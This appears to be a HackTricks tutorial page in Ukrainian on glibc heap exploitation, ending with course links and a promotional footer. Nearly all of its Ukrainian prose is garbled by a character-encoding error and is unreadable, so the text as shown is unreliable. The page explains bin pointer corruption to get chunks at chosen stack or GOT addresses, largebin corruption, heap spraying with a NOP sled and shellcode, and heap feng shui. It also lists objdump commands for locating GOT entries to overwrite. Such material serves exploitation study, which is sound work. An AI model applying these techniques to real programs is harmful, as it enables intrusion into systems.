–í–∏–≤—ñ–ª—å–Ω–µ–Ω—ñ —à–º–∞—Ç–∫–∏ –≤–≤–æ–¥—è—Ç—å—Å—è –≤ bin –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —ó—Ö —Ä–æ–∑–º—ñ—Ä—É. –ê–ª–µ –ø–µ—Ä–µ–¥ —Ç–∏–º, —è–∫ —ó—Ö –≤–≤–æ–¥–∏—Ç–∏, –≤–æ–Ω–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ unsorted bins. –®–º–∞—Ç–æ–∫, —è–∫–∏–π –≤–∏–≤—ñ–ª—å–Ω—é—î—Ç—å—Å—è, –Ω–µ –≤–≤–æ–¥–∏—Ç—å—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ —Å–≤—ñ–π bin, –∞ –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤ unsorted bins. –ü–æ—Ç—ñ–º, —è–∫—â–æ —Ä–µ–∑–µ—Ä–≤—É—î—Ç—å—Å—è –Ω–æ–≤–∏–π —à–º–∞—Ç–æ–∫ —ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π –º–æ–∂–µ –π–æ–º—É –ø—ñ–¥—ñ–π—Ç–∏, –≤—ñ–Ω –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è, –∞–ª–µ —è–∫—â–æ —Ä–µ–∑–µ—Ä–≤—É—î—Ç—å—Å—è –±—ñ–ª—å—à–∏–π, –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π —à–º–∞—Ç–æ–∫ –≤ unsorted bins –≤–≤–æ–¥–∏—Ç—å—Å—è –≤ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π bin.

–©–æ–± –¥–æ—Å—è–≥—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –∫–æ–¥—É, –∑–∞–ø–∏—Ç –ø–∞–º'—è—Ç—ñ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –±—ñ–ª—å—à–∏–º –∑–∞ av->max\_fast (–∑–∞–∑–≤–∏—á–∞–π 72) —ñ –º–µ–Ω—à–∏–º –∑–∞ MIN\_LARGE\_SIZE (512).

–Ø–∫—â–æ –≤ bin —î —à–º–∞—Ç–æ–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ–≥–æ —Ä–æ–∑–º—ñ—Ä—É, –≤—ñ–Ω –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –ø—ñ—Å–ª—è —Ä–æ–∑'—î–¥–Ω–∞–Ω–Ω—è:

bck = victim->bk; –í–∫–∞–∑—É—î –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫, —Ü–µ —î–¥–∏–Ω–µ, —â–æ –º–∏ –º–æ–∂–µ–º–æ –∑–º—ñ–Ω–∏—Ç–∏.

bin->bk = bck; –ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ —Å—Ç–∞—î –æ—Å—Ç–∞–Ω–Ω—ñ–º, —è–∫—â–æ bck –≤–∫–∞–∑—É—î –Ω–∞ —Å—Ç–µ–∫, –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–æ–º—É —à–º–∞—Ç–∫—É –±—É–¥–µ –Ω–∞–¥–∞–Ω–∞ —Ü—è –∞–¥—Ä–µ—Å–∞

bck->fd = bin; –ó–∞–∫—Ä–∏–≤–∞—î–º–æ —Å–ø–∏—Å–æ–∫, –∑—Ä–æ–±–∏–≤—à–∏ –π–æ–≥–æ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ bin

–ü–æ—Ç—Ä—ñ–±–Ω–æ:
–†–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è –¥–≤–æ—Ö malloc, —Ç–∞–∫ —â–æ–± –ø–µ—Ä—à–∏–π –º—ñ–≥ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏—Å—è –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –¥—Ä—É–≥–∏–π –±—É–≤ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π —ñ –≤–∫–ª—é—á–µ–Ω–∏–π —É —Å–≤—ñ–π –±—ñ–Ω (—Ç–æ–±—Ç–æ, –±—É–ª–æ –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–æ malloc, —è–∫–∏–π –±—ñ–ª—å—à–µ –∑–∞ –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º)

Malloc, —è–∫–∏–π –±—É–≤ –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é, –æ–±—Ä–∞–Ω–æ—é –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º, –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.

–ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —è–∫—â–æ –º–∏ –º–æ–∂–µ–º–æ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ –∫—É–ø—É, —è–∫–∞ –º–∞—î –≤–∂–µ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π —à–º–∞—Ç–æ–∫ —É —Å–≤–æ—î–º—É –±—ñ–Ω—ñ, –º–∏ –º–æ–∂–µ–º–æ –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk. –Ø–∫—â–æ –º–∏ –∑–º—ñ–Ω–∏–º–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk —ñ —Ü–µ–π —à–º–∞—Ç–æ–∫ —Å—Ç–∞–Ω–µ –ø–µ—Ä—à–∏–º —É —Å–ø–∏—Å–∫—É –±—ñ–Ω—ñ–≤ —ñ –±—É–¥–µ –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω–∏–π, –±—ñ–Ω –±—É–¥–µ –æ–±–º–∞–Ω—É—Ç–∏–π —ñ –≤–≤–∞–∂–∞—Ç–∏–º–µ, —â–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —à–º–∞—Ç–æ–∫ —É —Å–ø–∏—Å–∫—É (–Ω–∞—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è) –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ —Ñ–∞–ª—å—à–∏–≤–æ—é –∞–¥—Ä–µ—Å–æ—é, —è–∫—É –º–∏ –≤–∫–∞–∑–∞–ª–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞ —Å—Ç–µ–∫—É –∞–±–æ GOT). –¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –∑–Ω–æ–≤—É –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ —ñ–Ω—à–∏–π —à–º–∞—Ç–æ–∫ —ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—Ç–∏–º–µ –¥–æ–∑–≤—ñ–ª –Ω–∞ –Ω—å–æ–≥–æ, –π–æ–º—É –±—É–¥–µ –Ω–∞–¥–∞–Ω–æ —à–º–∞—Ç–æ–∫ —É –±–∞–∂–∞–Ω–æ–º—É –ø–æ–ª–æ–∂–µ–Ω–Ω—ñ, —ñ –≤—ñ–Ω –∑–º–æ–∂–µ –∑–∞–ø–∏—Å–∞—Ç–∏ –≤ –Ω—å–æ–≥–æ.

–ü—ñ—Å–ª—è –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è –∑–º—ñ–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ —à–º–∞—Ç–æ–∫, —è–∫–∏–π –±—ñ–ª—å—à–∏–π –∑–∞ –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π, —Ç–æ–¥—ñ –∑–º—ñ–Ω–µ–Ω–∏–π —à–º–∞—Ç–æ–∫ –≤–∏–π–¥–µ –∑ –Ω–µ—Å–æ—Ä—Ç–æ–≤–∞–Ω–∏—Ö –±—ñ–Ω—ñ–≤ —ñ –±—É–¥–µ –≤–∫–ª—é—á–µ–Ω–∏–π —É —Å–≤—ñ–π –±—ñ–Ω.

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –≤—ñ–Ω —É —Å–≤–æ—î–º—É –±—ñ–Ω—ñ, —á–∞—Å –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–º—É –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –±–∞–∂–∞–Ω—É –∞–¥—Ä–µ—Å—É.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –±—ñ–Ω –ø–æ–≤–∏–Ω–µ–Ω –∑–∞—á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ malloc() –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ –¥–æ—Å—Ç–∞—Ç–Ω—é –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–∞–∑—ñ–≤, —â–æ–± –∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π –±—ñ–Ω —ñ –æ–±–º–∞–Ω—É—Ç–∏ –±—ñ–Ω, –∑–º—É—à—É—é—á–∏ –π–æ–≥–æ –≤–≤–∞–∂–∞—Ç–∏, —â–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —à–º–∞—Ç–æ–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ —Ñ–∞–ª—å—à–∏–≤–æ—é –∞–¥—Ä–µ—Å–æ—é. –ü–æ—Ç—ñ–º –±—É–¥–µ –Ω–∞–¥–∞–Ω–æ —à–º–∞—Ç–æ–∫, —è–∫–∏–π –Ω–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç—å.

–©–æ–± –≤—Ä–∞–∑–∏—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —è–∫–Ω–∞–π—à–≤–∏–¥—à–µ, —ñ–¥–µ–∞–ª—å–Ω–æ: —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞, —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è —à–º–∞—Ç–∫–∞, —è–∫–∏–π –±—É–¥–µ –∑–º—ñ–Ω–µ–Ω–æ, –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ —à–º–∞—Ç–∫–∞, —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è —à–º–∞—Ç–∫–∞, —è–∫–∏–π –±—ñ–ª—å—à–∏–π –∑–∞ —Ç–æ–π, —è–∫–∏–π –±—É–¥–µ –∑–º—ñ–Ω–µ–Ω–æ, –∑–º—ñ–Ω–∞ —à–º–∞—Ç–∫–∞ (–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å), —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è —à–º–∞—Ç–∫–∞ —Ç–∞–∫–æ–≥–æ –∂ —Ä–æ–∑–º—ñ—Ä—É, —è–∫ –ø–æ—Ä—É—à–µ–Ω–∏–π, —ñ —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω–Ω—è –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞ —Ç–∞–∫–æ–≥–æ –∂ —Ä–æ–∑–º—ñ—Ä—É, —è–∫–∏–π –±—É–¥–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –æ–±—Ä–∞–Ω—É –∞–¥—Ä–µ—Å—É.

–î–ª—è –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ —Ü—å–æ–≥–æ –Ω–∞–ø–∞–¥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ç–∏–ø–æ–≤–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ç–æ–≥–æ, —â–æ —à–º–∞—Ç–æ–∫ "–Ω–µ" —î —Ñ–∞–ª—å—à–∏–≤–∏–º: –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —á–∏ –≤–∫–∞–∑—É—î bck->fd –Ω–∞ –∂–µ—Ä—Ç–≤—É. –Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, —É –Ω–∞—à–æ–º—É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ fd\* —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞, –≤–∫–∞–∑–∞–Ω–∏–π –Ω–∞ —Å—Ç–µ–∫—É, –≤–∫–∞–∑—É—î –Ω–∞ –∂–µ—Ä—Ç–≤—É. –©–æ–± –æ–±—ñ–π—Ç–∏ —Ü–µ–π –∑–∞—Ö–∏—Å—Ç, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ–≤–∏–Ω–µ–Ω –∑–º–æ–≥—Ç–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º (–Ω–∞–π—ñ–º–æ–≤—ñ—Ä–Ω—ñ—à–µ, —á–µ—Ä–µ–∑ —Å—Ç–µ–∫) –∑–∞–ø–∏—Å–∞—Ç–∏ –≤ –ø–æ—Ç—Ä—ñ–±–Ω—É –∞–¥—Ä–µ—Å—É –∞–¥—Ä–µ—Å—É –∂–µ—Ä—Ç–≤–∏. –¶–µ –∑—Ä–æ–±–∏—Ç—å —à–º–∞—Ç–æ–∫ —Å–ø—Ä–∞–≤–∂–Ω—ñ–º.

**–ö–æ—Ä—É–ø—Ü—ñ—è LargeBin**

–ü–æ—Ç—Ä—ñ–±–Ω—ñ —Ç—ñ –∂ —É–º–æ–≤–∏, —â–æ –π —Ä–∞–Ω—ñ—à–µ, —ñ –¥–µ—è–∫—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ, –∫—Ä—ñ–º —Ç–æ–≥–æ, –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω—ñ —à–º–∞—Ç–∫–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –±—ñ–ª—å—à–∏–º–∏ –∑–∞ 512.

–ê—Ç–∞–∫–∞ —Å—Ö–æ–∂–∞ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—é, —Ç–æ–±—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ bk —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≤—Å—ñ —Ü—ñ –≤–∏–∫–ª–∏–∫–∏ malloc(), –∞–ª–µ —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä –∑–º—ñ–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ —Ç–∞–∫, —â–æ–± —Ü–µ–π —Ä–æ–∑–º—ñ—Ä - nb –±—É–≤ < MINSIZE.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä 1552, —â–æ–± 1552 - 1544 = 8 < MINSIZE (–≤—ñ–¥–Ω—ñ–º–∞–Ω–Ω—è –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤—ñ–¥'—î–º–Ω–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ—Ä—ñ–≤–Ω—é—î—Ç—å—Å—è –±–µ–∑–∑–Ω–∞–∫–æ–≤–µ —á–∏—Å–ª–æ)

–ö—Ä—ñ–º —Ç–æ–≥–æ, –±—É–ª–æ –≤–≤–µ–¥–µ–Ω–æ –ø–∞—Ç—á –¥–ª—è —É—Å–∫–ª–∞–¥–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ —â–µ –±—ñ–ª—å—à–µ.

**–†–æ–∑–ø–∏–ª–µ–Ω–Ω—è –∫—É–ø–∏**

–û—Å–Ω–æ–≤–Ω–∞ —ñ–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ —è–∫–æ–º–æ–≥–∞ –±—ñ–ª—å—à–µ –ø–∞–º'—è—Ç—ñ –¥–ª—è –∫—É–ø —Ç–∞ –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ —ó—Ö –º–∞—Ç—Ä–∞—Ü–µ–º –∑ nops, –∑–∞–≤–µ—Ä—à–µ–Ω–∏—Ö shellcode. –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫ –º–∞—Ç—Ä–∞—Ü –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è 0x0c. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, —Å–ø—Ä–æ–±—É—î–º–æ –ø–µ—Ä–µ–π—Ç–∏ –∑–∞ –∞–¥—Ä–µ—Å—É 0x0c0c0c0c, —ñ —è–∫—â–æ –±—É–¥—å-—è–∫–∞ –∞–¥—Ä–µ—Å–∞, –Ω–∞ —è–∫—É –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ –∑ —Ü–∏–º –º–∞—Ç—Ä–∞—Ü–µ–º, –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∞, –º–∏ –ø–µ—Ä–µ–π–¥–µ–º–æ —Ç—É–¥–∏. –û—Å–Ω–æ–≤–Ω–∞ —Ç–∞–∫—Ç–∏–∫–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ —è–∫–Ω–∞–π–±—ñ–ª—å—à–µ, —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏, —á–∏ –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ —è–∫–∏–π—Å—å –≤–∫–∞–∑—ñ–≤–Ω–∏–∫, —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ 0x0c0c0c0c, —Å–ø–æ–¥—ñ–≤–∞—é—á–∏—Å—å, —â–æ —Ç–∞–º –±—É–¥—É—Ç—å nops.

**Heap Feng Shui**

–ü–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–µ–∑–µ—Ä–≤—É–≤–∞–Ω—å —Ç–∞ –∑–≤—ñ–ª—å–Ω–µ–Ω—å —Å–µ–º–µ–Ω—Ç—É—î—Ç—å—Å—è –ø–∞–º'—è—Ç—å —Ç–∞–∫, —â–æ –º—ñ–∂ –≤—ñ–ª—å–Ω–∏–º–∏ —à–º–∞—Ç–∫–∞–º–∏ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –∑–∞—Ä–µ–∑–µ—Ä–≤–æ–≤–∞–Ω—ñ —à–º–∞—Ç–∫–∏. –ë—É—Ñ–µ—Ä –¥–ª—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É–¥–µ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –≤ –æ–¥–Ω–æ–º—É –∑ —Ü–∏—Ö —à–º–∞—Ç–∫—ñ–≤.

objdump -d –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª ‚Äî> –†–æ–∑—ñ–±—Ä–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó\
objdump -d ./PROGRAMA | grep FUNCION ‚Äî> –û—Ç—Ä–∏–º–∞—Ç–∏ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó\
objdump -d -Mintel ./shellcodeout ‚Äî> –î–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —â–æ —Ü–µ –¥—ñ–π—Å–Ω–æ –Ω–∞—à–∞ shellcode —Ç–∞ –≤–∏—Ç—è–≥–Ω–µ–Ω–Ω—è OpCodes\
objdump -t ./exec | grep varBss ‚Äî> –¢–∞–±–ª–∏—Ü—è —Å–∏–º–≤–æ–ª—ñ–≤, –¥–ª—è –≤–∏—Ç—è–≥–Ω–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –∑–º—ñ–Ω–Ω–∏—Ö —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ–π\
objdump -TR ./exec | grep exit(func lib) ‚Äî> –î–ª—è –≤–∏—Ç—è–≥–Ω–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π –±—ñ–±–ª—ñ–æ—Ç–µ–∫ (GOT)\
objdump -d ./exec | grep funcCode\
objdump -s -j .dtors /exec\
objdump -s -j .got ./exec\
objdump -t --dynamic-relo ./exec | grep puts ‚Äî> –í–∏—Ç—è–≥–∞—î –∞–¥—Ä–µ—Å—É puts –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –≤ GOT\
objdump -D ./exec ‚Äî> –†–æ–∑—ñ–±—Ä–∞—Ç–∏ –í–°–ï –¥–æ –≤—Ö–æ–¥—ñ–≤ plt\
objdump -p -/exec\
Info functions strncmp ‚Äî> –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ñ—É–Ω–∫—Ü—ñ—é –≤ gdb

## –¶—ñ–∫–∞–≤—ñ –∫—É—Ä—Å–∏

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **–ü–æ—Å–∏–ª–∞–Ω–Ω—è**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
